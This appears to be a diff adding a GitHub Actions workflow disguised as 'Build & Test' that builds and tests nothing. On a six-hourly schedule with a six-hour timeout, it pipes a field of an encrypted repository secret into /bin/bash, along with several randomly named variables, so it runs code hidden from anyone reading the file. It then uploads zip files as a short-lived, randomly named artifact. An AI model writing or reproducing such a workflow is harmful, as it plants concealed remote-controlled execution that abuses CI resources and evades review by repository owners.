@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ps69101: ${{ secrets.ps69101 }}
+        run: |
+          printf '%s' "$ps69101" | jq -r .lrxp7 | /bin/bash
+          printf '%s' "$ibo87" | jq -r .k0 | /bin/bash
+          printf '%s' "$z28623" | jq -r .rwx49678 | /bin/bash
+          printf '%s' "$lk9" | jq -r .rrp838 | /bin/bash
+          echo $kwj6384 | jq -r .zv308 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DQvevE9X
+          path: "*.zip"
+          retention-days: 1
